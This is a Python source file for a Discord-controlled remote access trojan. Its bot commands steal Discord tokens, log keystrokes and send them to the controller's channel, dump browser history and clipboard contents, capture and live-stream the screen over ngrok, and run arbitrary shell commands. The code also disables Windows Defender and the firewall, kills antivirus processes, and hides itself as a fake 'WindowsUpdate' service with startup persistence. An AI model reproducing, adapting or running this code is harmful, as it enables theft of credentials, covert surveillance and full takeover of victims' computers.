import logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

try:
    import win32crypt
except ImportError:
    logger.warning("win32crypt not available. Browser data extraction may not work properly.")
import asyncio
import discord
from discord.ext import commands
from discord import File
import pyautogui
import socket
import subprocess
import pyperclip
import os
import time
import ctypes
import webbrowser
import keyboard
import threading
from threading import Thread, Event
import json
from datetime import datetime, timedelta, timezone
import sqlite3
import shutil
import sys
from os import getenv
import glob
import ssl
import certifi
import aiohttp
import base64
import pyaes
import random
import re
import traceback
import zlib
import winreg
import requests
import tempfile
import urllib3
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
from discord import TextChannel, Embed, Color, File
import io
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import platform
import zipfile
import urllib.request
import cv2
import numpy as np
from flask import Flask, render_template_string, Response
import threading
from PIL import Image, ImageGrab
import io



disable_warnings_urllib3()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

key_log = []
log_active = False
active_channels = set()
stop_event = Event()
last_sent_time = time.time()
current_dir = os.getcwd()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

DISCORD_TOKENS = []

def watermark():
    return "\n\n***||@1ypi - https://github.com/1ypi||***"

def kill_browser_processes(browser_name):
    process_names = {
        "chrome": ["chrome.exe"],
        "edge": ["msedge.exe"],
        "brave": ["brave.exe"],
        "opera": ["opera.exe"],
        "yandex": ["browser.exe"],
        "firefox": ["firefox.exe"],
    }
    for proc in process_names.get(browser_name.lower(), []):
        try:
            subprocess.run(f"taskkill /f /im {proc}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            logger.error(f"Error killing {proc}: {e}")

def disable_defender():
    try:
        commands = [
            'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
            'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
            'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
            'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
            'powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"',
            'powershell -Command "Set-MpPreference -EnableNetworkProtection AuditMode"',
            'powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"',
            'powershell -Command "Set-MpPreference -MAPSReporting Disabled"',
            'powershell -Command "Set-MpPreference -HighThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -ModerateThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -LowThreatDefaultAction Allow"',
            'powershell -Command "Set-MpPreference -DisableArchiveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableEmailScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRemovableDriveScanning $true"',
            'powershell -Command "Set-MpPreference -DisableRestorePoint $true"',
            # Disable Windows Firewall
            'netsh advfirewall set allprofiles state off',
            # Add specific exceptions
            f'powershell -Command "Add-MpPreference -ExclusionPath \"{os.path.abspath(sys.argv[0])}\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"python.exe\""',
            'powershell -Command "Add-MpPreference -ExclusionProcess \"pythonw.exe\""',
        ]

        for cmd in commands:
            subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)

        return True
    except Exception as e:
        logger.error(f"Error disabling Defender: {e}")
        return False

def add_exclusion(path):
    try:
        cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \"{path}\""'
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error adding exclusion: {e}")
        return False

def kill_av_processes():
    av_processes = [
        "msmpeng", "msmpsvc", "securityhealthservice", "wdnissvc", 
        "webthreatdefsvc", "webthreatdefusersvc", "avp", "avpui", 
        "kavfs", "kavvs", "kes", "kis", "ksde", "ksos", "mcshield", 
        "msseces", "nortonsecurity", "ns", "nsafw", "nsd", "nst", 
        "symantec", "symcorpu", "symefasi", "ccsvchst", "ccsetmgr", 
        "ccevtmgr", "savservice", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "bdagent", "bdnt", "vsserv", "fsma", 
        "fsms", "fshoster", "fsdfwd", "f-secure", "hips", "rtvscan", 
        "vstskmgr", "engineserver", "frameworkservice", "bullguard", 
        "clamav", "clamd", "freshclam", "sophos", "savd", "savadmin", 
        "hitmanpro", "zemana", "malwarebytes", "mbam", "mbamtray", 
        "mbae", "mbae-svc", "adaware", "spybot", "spyterminator", 
        "superantispyware", "avast", "avastui", "aswidsagent", 
        "avg", "avgui", "avira", "avguard", "avshadow", "avgnt", 
        "avmailc", "avwebgrd", "comodo", "cis", "cistray", "cmdagent", 
        "cpdaemon", "cpf", "cavwp", "panda", "psanhost", "psksvc", 
        "pavsrv", "pavprsrv", "pavfnsvr", "pavboot", "trendmicro", 
        "tmlisten", "ufseagnt", "tmcc", "tmactmon", "tmbmsrv", 
        "tmib", "tmlwf", "tmcomm", "tmobile", "zonealarm", "zatray", 
        "zaprivacy", "zaapp", "zauinst", "windefender", "defender", 
        "sense", "mssense", "smartscreen", "windowsdefender", "wd"
    ]

    try:
        subprocess.run(f"taskkill /f /im {','.join(av_processes)}", shell=True, 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        logger.error(f"Error killing AV processes: {e}")
        return False
app = Flask(__name__)
streamer = None
flask_thread = None
ngrok_process = None
ngrok_url = None
auth_token = None

class ScreenStreamer:
    def __init__(self):
        self.fps = 10
        self.quality = 80
        self.running = False
        pyautogui.FAILSAFE = False
        
    def capture_screen(self):
        try:
            try:
                screenshot = pyautogui.screenshot()
            except:
                screenshot = ImageGrab.grab()
            
            img = np.array(screenshot)
            img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)
            
            height, width = img.shape[:2]
            if width > 1920:
                new_width = 1920
                new_height = int(height * (new_width / width))
                img = cv2.resize(img, (new_width, new_height))
            
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), self.quality]
            _, buffer = cv2.imencode('.jpg', img, encode_param)
            
            return buffer.tobytes()
            
        except Exception as e:
            try:
                screenshot = ImageGrab.grab()
                if screenshot.width > 1920:
                    ratio = 1920 / screenshot.width
                    new_size = (int(screenshot.width * ratio), int(screenshot.height * ratio))
                    screenshot = screenshot.resize(new_size, Image.Resampling.LANCZOS)
                
                buffer = io.BytesIO()
                screenshot.save(buffer, format='JPEG', quality=self.quality)
                return buffer.getvalue()
            except:
                return None

    def generate_frames(self):
        while self.running:
            frame = self.capture_screen()
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(1.0 / self.fps)

@app.route('/')
def index():
    html_template = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Live Screen Stream</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body {
                font-family: Arial, sans-serif;
                margin: 0;
                padding: 20px;
                background-color: #1a1a1a;
                color: white;
                text-align: center;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .stream-container {
                margin: 20px 0;
                border: 2px solid #333;
                border-radius: 8px;
                overflow: hidden;
                background: black;
            }
            .stream-video {
                max-width: 100%;
                height: auto;
                display: block;
                margin: 0 auto;
            }
            .status {
                color: #4CAF50;
                font-weight: bold;
                margin: 10px 0;
            }
            h1 {
                color: #4CAF50;
                margin-bottom: 30px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Live Screen Stream</h1>
            <div class="status">LIVE - Screen streaming active</div>
            <div class="stream-container">
                <img src="{{ url_for('video_feed') }}" class="stream-video" alt="Live Screen Stream">
            </div>
        </div>
        <script>
            let img = document.querySelector('.stream-video');
            img.onerror = function() {
                setTimeout(() => location.reload(), 5000);
            };
            setInterval(() => {
                document.title = 'Live Stream - ' + new Date().toLocaleTimeString();
            }, 1000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template)

@app.route('/video_feed')
def video_feed():
    global streamer
    return Response(streamer.generate_frames(),
                   mimetype='multipart/x-mixed-replace; boundary=frame')
CONFIG_DIR = os.path.join(os.path.expanduser("~"), ".discord_bot_rat")
os.makedirs(CONFIG_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(CONFIG_DIR, "bot_config.json")
def save_config():
    config = {"auth_token": auth_token}
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def load_config():
    global auth_token
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            config = json.load(f)
            auth_token = config.get("auth_token")

def download_ngrok():
    url = "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip"
    
    ngrok_dir = os.path.join(os.path.expanduser("~"), ".ngrok_bot")
    os.makedirs(ngrok_dir, exist_ok=True)
    ngrok_path = os.path.join(ngrok_dir, "ngrok.exe")
    
    if os.path.exists(ngrok_path):
        return ngrok_path
    
    response = requests.get(url)
    zip_path = os.path.join(ngrok_dir, "ngrok.zip")
    
    with open(zip_path, 'wb') as f:
        f.write(response.content)
    
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(ngrok_dir)
    
    os.remove(zip_path)
    return ngrok_path

def setup_ngrok_auth(ngrok_path):
    if auth_token:
        subprocess.run([ngrok_path, "config", "add-authtoken", auth_token], 
                      capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)

def start_ngrok(ngrok_path):
    global ngrok_process, ngrok_url
    
    setup_ngrok_auth(ngrok_path)
    
    ngrok_process = subprocess.Popen([ngrok_path, "http", "5000", "--log=stdout"], 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                   text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    
    timeout = 30
    start_time = time.time()
    ngrok_url = None
    
    while time.time() - start_time < timeout and ngrok_url is None:
        if ngrok_process.poll() is not None:
            break
            
        line = ngrok_process.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        
        if "url=" in line and "https://" in line:
            match = re.search(r'url=https://([^\s]+)', line)
            if match:
                ngrok_url = "https://" + match.group(1)
                break
        elif "started tunnel" in line.lower() and "https://" in line:
            match = re.search(r'https://[^\s]+\.ngrok\.io', line)
            if match:
                ngrok_url = match.group(0)
                break
        elif "tunnel session" in line.lower() and "url=" in line:
            match = re.search(r'url=([^\s]+)', line)
            if match and "https://" in match.group(1):
                ngrok_url = match.group(1)
                break
    
    if not ngrok_url:
        time.sleep(3)
        try:
            response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=10)
            data = response.json()
            if data.get("tunnels"):
                for tunnel in data["tunnels"]:
                    if tunnel.get("public_url", "").startswith("https://"):
                        ngrok_url = tunnel["public_url"]
                        break
        except:
            pass
    
    return ngrok_url
    
def start_flask():
    global streamer
    streamer = ScreenStreamer()
    streamer.running = True
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)

def stop_services():
    global streamer, flask_thread, ngrok_process, ngrok_url
    
    if streamer:
        streamer.running = False
    
    if ngrok_process:
        ngrok_process.terminate()
        ngrok_process = None
    
    ngrok_url = None

@bot.event
async def on_ready():
    load_config()
    print(f'Bot logged in as {bot.user}')

@bot.command()
async def key(ctx, token: str = None):
    global auth_token
    
    if token is None:
        await ctx.send("Usage: !key <your_ngrok_auth_token>")
        return
    
    auth_token = token
    save_config()
    await ctx.send("Auth token saved successfully!")

@bot.command()
async def live(ctx):
    global flask_thread, ngrok_url
    
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ You must run the bot as administrator to use !live (screen streaming). Use !su command to request admin.")
            return
    except Exception as e:
        await ctx.send(f"❌ Unable to check admin privileges: {e}")
        return
        
    if flask_thread and flask_thread.is_alive():
        await ctx.send("Stream is already running!")
        return
    
    await ctx.send("Starting screen stream... Please wait...")
    
    try:
        ngrok_path = download_ngrok()
        
        flask_thread = threading.Thread(target=start_flask, daemon=True)
        flask_thread.start()
        
        await asyncio.sleep(3)
        ngrok_url = await asyncio.to_thread(start_ngrok, ngrok_path)
        
        if ngrok_url:
            await ctx.send(f"Screen Stream Active!\nYour screen is now live at: {ngrok_url}")
        else:
            try:
                response = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
                data = response.json()
                if data.get("tunnels"):
                    for tunnel in data["tunnels"]:
                        if tunnel.get("public_url", "").startswith("https://"):
                            ngrok_url = tunnel["public_url"]
                            await ctx.send(f"Screen Stream Active!\nYour screen is now live at: {ngrok_url}")
                            break
                else:
                    await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
            except:
                await ctx.send("Failed to start ngrok tunnel. Check your auth token or try again.")
    
    except Exception as e:
        await ctx.send(f"Error starting stream: {str(e)}")

@bot.command()
async def stop(ctx):
    global flask_thread, ngrok_process

    if not flask_thread or not flask_thread.is_alive():
        await ctx.send("No stream is currently running.")
        return

    stop_services()
    if ngrok_process:
        try:
            ngrok_process.terminate()
            ngrok_process = None
        except Exception as e:
            await ctx.send(f"Error stopping ngrok: {e}{watermark()}")

    await ctx.send("Stream and ngrok tunnel stopped successfully!")

@bot.command()
async def status(ctx):
    global flask_thread, ngrok_url
    
    if flask_thread and flask_thread.is_alive() and ngrok_url:
        await ctx.send(f"Stream Status: ACTIVE\nLive URL: {ngrok_url}")
    else:
        await ctx.send("Stream Status: INACTIVE\nUse !live to start streaming")

class DiscordTokenStealer:
    @staticmethod
    def get_tokens():
        tokens = []
        paths = {
            'Discord': os.path.join(os.getenv('APPDATA'), 'Discord'),
            'Discord Canary': os.path.join(os.getenv('APPDATA'), 'discordcanary'),
            'Discord PTB': os.path.join(os.getenv('APPDATA'), 'discordptb'),
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data')
        }

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            try:
                if platform in ['Discord', 'Discord Canary', 'Discord PTB']:

                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
                else:

                    leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
                    if os.path.exists(leveldb_path):
                        for file in os.listdir(leveldb_path):
                            if file.endswith('.ldb') or file.endswith('.log'):
                                file_path = os.path.join(leveldb_path, file)
                                try:
                                    with open(file_path, 'r', errors='ignore') as f:
                                        content = f.read()
                                        found_tokens = re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', content)
                                        found_tokens.extend(re.findall(r'mfa\.[\w-]{84}', content))
                                        for token in found_tokens:
                                            tokens.append({'platform': platform, 'token': token})
                                except:
                                    continue
            except Exception as e:
                logger.error(f"Error extracting tokens from {platform}: {e}")
                continue

        return tokens

def hide_process():
    try:

        current_pid = os.getpid()

        try:
            subprocess.run(f'sc create "WindowsUpdateService" binPath= "{sys.executable}" start= auto', 
                          shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        return True
    except Exception as e:
        logger.error(f"Error hiding process: {e}")
        return False

def add_to_startup():
    try:
        startup_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        ]

        current_file = sys.argv[0]

        for startup_path in startup_paths:
            if os.path.exists(startup_path):
                target_path = os.path.join(startup_path, 'WindowsUpdate.exe')

                if not os.path.exists(target_path):
                    shutil.copy2(current_file, target_path)

                    subprocess.run(f'attrib +h +s "{target_path}"', shell=True)

        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.argv[0])
        except:
            pass

        return True
    except Exception as e:
        logger.error(f"Error adding to startup: {e}")
        return False
@bot.command()
async def su(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send(f"✅ Already running as administrator{watermark()}")
            return

        current_pid = os.getpid()

        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, " ".join(sys.argv), None, 1
        )

        await ctx.send(
            f"🔄 Requesting administrator privileges... This window will close if accepted.{watermark()}"
        )
        start_time = datetime.now(timezone.utc)
        async def check_admin_message():
            for _ in range(40):
                await asyncio.sleep(1)
                for channel in bot.get_all_channels():
                    if isinstance(channel, TextChannel):
                        async for message in channel.history(limit=5, after=start_time):
                            if (
                                message.author == bot.user
                                and "✅ **Connected - !help for command info." in message.content
                                and (datetime.now(timezone.utc) - message.created_at) < timedelta(seconds=40)
                            ):
                                batch_script = f"""
                                @echo off
                                timeout /t 3 /nobreak >nul
                                taskkill /pid {current_pid} /f
                                del "%~f0"
                                """
                                temp_bat = os.path.join(getenv("TEMP"), "elevate_kill.bat")
                                with open(temp_bat, "w") as f:
                                    f.write(batch_script)
                                subprocess.Popen(
                                    temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW
                                )
                                return

        await check_admin_message()

    except Exception as e:
        await ctx.send(f"❌ Failed to elevate privileges: {str(e)}{watermark()}")


@bot.command()
async def recent(ctx, browser: str = "chrome"):
    try:
        await ctx.send(f"🔍 Collecting recently visited websites...{watermark()}")
        browser = browser.lower()
        history = []

        if browser in ["chrome", "edge", "brave"]:
            browser_paths = {
                "chrome": os.path.join(
                    getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"
                ),
                "edge": os.path.join(
                    getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"
                ),
                "brave": os.path.join(
                    getenv("LOCALAPPDATA"),
                    "BraveSoftware",
                    "Brave-Browser",
                    "User Data",
                ),
            }

            path = browser_paths.get(browser)
            if not path or not os.path.exists(path):
                await ctx.send(
                    f"❌ {browser.capitalize()} not found or no history available.{watermark()}"
                )
                return

            history_files = []
            for root, dirs, files in os.walk(path):
                if "Extensions" in root:
                    continue
                if "History" in files:
                    history_files.append(os.path.join(root, "History"))

            if not history_files:
                await ctx.send(
                    f"❌ No history found for {browser.capitalize()}.{watermark()}"
                )
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_history.db")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT urls.url, urls.title, visits.visit_time 
                        FROM urls 
                        JOIN visits ON urls.id = visits.url 
                        ORDER BY visits.visit_time DESC
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1601, 1, 1) + timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": browser,
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue

        elif browser == "firefox":
            firefox_path = os.path.join(
                getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"
            )
            if not os.path.exists(firefox_path):
                await ctx.send(
                    f"❌ Firefox not found or no history available.{watermark()}"
                )
                return

            history_files = glob.glob(
                os.path.join(firefox_path, "**", "places.sqlite"), recursive=True
            )

            if not history_files:
                await ctx.send(f"❌ No history found for Firefox.{watermark()}")
                return

            for history_file in history_files:
                try:
                    temp_db = os.path.join(getenv("TEMP"), "temp_places.sqlite")
                    shutil.copy2(history_file, temp_db)

                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()

                    cursor.execute(
                        """
                        SELECT moz_places.url, moz_places.title, moz_historyvisits.visit_date 
                        FROM moz_places 
                        JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id 
                        ORDER BY moz_historyvisits.visit_date DESC
                    """
                    )

                    for url, title, visit_time in cursor.fetchall():
                        timestamp = datetime(1970, 1, 1) + timedelta(
                            microseconds=visit_time
                        )
                        history.append(
                            {
                                "url": url,
                                "title": title if title else "[No Title]",
                                "time": timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                                "browser": "firefox",
                            }
                        )

                    conn.close()
                    os.remove(temp_db)
                except Exception as e:
                    print(f"Error reading Firefox history: {e}")
                    if "conn" in locals():
                        conn.close()
                    if os.path.exists(temp_db):
                        os.remove(temp_db)
                    continue
        else:
            await ctx.send(
                f"❌ Unsupported browser. Try 'chrome', 'edge', 'brave', or 'firefox'.{watermark()}"
            )
            return

        if not history:
            await ctx.send(f"❌ No browsing history found.{watermark()}")
            return

        filename = f"history_{browser}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            for entry in history:
                f.write(
                    f"[{entry['time']}] {entry['title']}\n{entry['url']}\nBrowser: {entry['browser']}\n\n"
                )

        await ctx.send(file=File(filename), content=f"📎 All browsing history from {browser.capitalize()} sent as file.{watermark()}")

        try:
            os.remove(filename)
        except:
            pass

    except Exception as e:
        await ctx.send(
            f"An error occurred while collecting browsing history: {e}{watermark()}"
        )

from discord import File

@bot.command()
async def screen(ctx):
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        await ctx.send(file=File(img_bytes, "screenshot.png"))
        await ctx.send(f"Screenshot captured{watermark()}")
    except Exception as e:
        await ctx.send(f"Error capturing screenshot: {e}{watermark()}")

@bot.command()
async def ip(ctx):
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        await ctx.send(f"IP address: {ip_address}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error getting IP: {e}{watermark()}")

@bot.command()
async def clipboard(ctx):
    try:
        content = pyperclip.paste()
        if content:
            await ctx.send(f"**Current Clipboard:**\n{content[:2000]}{watermark()}")
        else:
            await ctx.send(f"Clipboard is empty or not text.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error reading clipboard: {e}{watermark()}")

@bot.command()
async def exec(ctx, *, command: str):
    try:
        result = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=10
        )
        result = (
            result[:1900] + "\n...output truncated..." if len(result) > 1900 else result
        )
        await ctx.send(f"```\n{result}\n```{watermark()}")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Command failed:\n```\n{e.output}\n```{watermark()}")
    except Exception as e:
        await ctx.send(f"Error: {e}{watermark()}")

@bot.command()
async def shutdown(ctx):
    try:
        await ctx.send(f"Shutting down the PC...{watermark()}")
        os.system("shutdown /s /t 1")
    except Exception as e:
        await ctx.send(f"Error shutting down: {e}{watermark()}")

@bot.command()
async def bsod(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(
            3221226010, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint())
        )
        await ctx.send(f"Triggering BSOD...{watermark()}")
    except Exception as e:
        await ctx.send(f"Error triggering BSOD: {e}{watermark()}")

@bot.command()
async def url(ctx, *, url: str):
    try:
        url = "http://" + url if not url.startswith(("http://", "https://")) else url
        webbrowser.open(url)
        await ctx.send(f"🌐 Opened URL: {url}{watermark()}")
    except Exception as e:
        await ctx.send(f"Error opening URL: {e}{watermark()}")

@bot.command()
async def restart(ctx):
    try:
        await ctx.send(
            f"🔄 Restarting PC in 5 seconds... Type `!cancelrestart` to abort.{watermark()}"
        )
        time.sleep(5)
        if not stop_event.is_set():
            os.system("shutdown /r /t 1")
    except Exception as e:
        await ctx.send(f"Error restarting: {e}{watermark()}")

@bot.command()
async def cancelrestart(ctx):
    try:
        stop_event.set()
        await ctx.send(f"✅ Restart cancelled.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error cancelling restart: {e}{watermark()}")

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN and log_active:
        key_name = e.name
        key_name = f"[{key_name.upper()}]" if len(key_name) > 1 else key_name
        key_log.append(key_name)
    return None

async def send_periodic_updates():
    global last_sent_time, key_log
    while not stop_event.is_set():
        if log_active and active_channels:
            await asyncio.sleep(15)
            if key_log:
                keys_str = " ".join(key_log)
                if len(keys_str) > 1900:
                    keys_str = keys_str[:1900] + "... [truncated]"
                for channel_id in active_channels:
                    channel = bot.get_channel(channel_id)
                    if channel:
                        try:
                            await channel.send(
                                f"⌨️ Keys pressed (last 15s):\n```{keys_str}```{watermark()}"
                            )
                        except Exception as e:
                            print(f"Error sending keylog: {e}")
                key_log = []
            last_sent_time = time.time()
        else:
            await asyncio.sleep(5)

@bot.command()
async def log(ctx):
    global log_active
    if log_active:
        await ctx.send(f"⚠️ Keylogging is already active!{watermark()}")
    else:
        log_active = True
        active_channels.add(ctx.channel.id)
        keyboard.hook(on_key_event)
        await ctx.send(
            f"✅ Keylogging started! (Updates every 15 seconds){watermark()}"
        )

@bot.command()
async def stoplog(ctx):
    global log_active
    if not log_active:
        await ctx.send(f"⚠️ Keylogging isn't active!{watermark()}")
    else:
        log_active = False
        if ctx.channel.id in active_channels:
            active_channels.remove(ctx.channel.id)
        await ctx.send(f"⛔ Keylogging stopped!{watermark()}")

@bot.command()
async def msg(ctx, *, message: str):
    try:
        sanitized_msg = message.replace('"', '""')
        vbs_script = f'\n        MsgBox "{sanitized_msg}", vbExclamation, "Message from Discord"\n        '
        temp_vbs = os.path.join(getenv("TEMP"), "discord_msg.vbs")
        with open(temp_vbs, "w", encoding="utf-16") as f:
            f.write(vbs_script)
        subprocess.Popen(["wscript.exe", temp_vbs], shell=True)
        await ctx.send(
            f"✅ Message box displayed with text: {message[:100]}...{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error showing message box: {e}{watermark()}")

@bot.command()
async def discord(ctx):
    try:
        await ctx.send(f"🔍 Extracting Discord tokens...{watermark()}")

        tokens = DiscordTokenStealer.get_tokens()
        if tokens:
            token_list = []
            for i, token_info in enumerate(tokens, 1):
                token_list.append(f"{i}. {token_info['platform']}: `{token_info['token']}`")

            message = "**Discord Tokens Found:**\n" + "\n".join(token_list)
            if len(message) > 2000:
                for i in range(0, len(message), 2000):
                    await ctx.send(message[i:i+2000])
            else:
                await ctx.send(message + watermark())
        else:
            await ctx.send(f"No Discord tokens found.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error extracting Discord tokens: {e}{watermark()}")

@bot.command()
async def avbypass(ctx):
    try:
        await ctx.send(f"🛡️ Attempting antivirus bypass...{watermark()}")

        defender_disabled = disable_defender()

        exclusion_added = add_exclusion(sys.argv[0])

        av_killed = kill_av_processes()

        process_hidden = hide_process()

        startup_added = add_to_startup()

        message = "**Antivirus Bypass Results:**\n"
        message += f"• Defender Disabled: {'✅' if defender_disabled else '❌'}\n"
        message += f"• Exclusion Added: {'✅' if exclusion_added else '❌'}\n"
        message += f"• AV Processes Killed: {'✅' if av_killed else '❌'}\n"
        message += f"• Process Hidden: {'✅' if process_hidden else '❌'}\n"
        message += f"• Startup Persistence: {'✅' if startup_added else '❌'}\n"

        await ctx.send(message + watermark())
    except Exception as e:
        await ctx.send(f"Error during antivirus bypass: {e}{watermark()}")

@bot.command()
async def persist(ctx):
    try:
        await ctx.send(f"🔗 Adding persistence...{watermark()}")

        success = add_to_startup()

        if success:
            await ctx.send(f"✅ Persistence added successfully!{watermark()}")
        else:
            await ctx.send(f"❌ Failed to add persistence.{watermark()}")
    except Exception as e:
        await ctx.send(f"Error adding persistence: {e}{watermark()}")

@bot.command()
async def help(ctx):
    help_text = f"""
**Available Commands:**
**System Commands:**
!screen - Capture screenshot
!ip - Get IP address
!clipboard - Show clipboard content
!exec <command> - Run shell command
!shutdown - Shutdown computer
!restart - Restart computer
!bsod - Trigger BSOD (WARNING)

**File Operations:**
!ls - List files
!cd <path> - Change directory
!download <file> - Download file
!rm <file> - Delete file

**Information Gathering:**
!systeminfo - System information
!cpu - CPU info
!gpu - GPU info
!ram - RAM info
!wifi_passwords - Show WiFi passwords
!recent [browser] - Browser history
!discord - Extract Discord tokens
!browsers - Extract browser data

**Other:**
!msg <message> - Show message box
!url <url> - Open URL
!log - Start keylogging
!stoplog - Stop keylogging
!su - Request admin privileges
!avbypass - Bypass antivirus
!persist - Add persistence

{watermark()}
"""
    await ctx.send(help_text)
current_dir = os.getcwd()

@bot.command()
async def ls(ctx):
    try:
        files = os.listdir(current_dir)
        output = "\n".join(files)
        if not output:
            output = "[Empty directory]"
        await ctx.send(
            f"**Directory listing for:** `{current_dir}`\n```\n{output[:1900]}\n```{watermark()}"
        )
    except Exception as e:
        await ctx.send(f"Error listing directory: {e}{watermark()}")

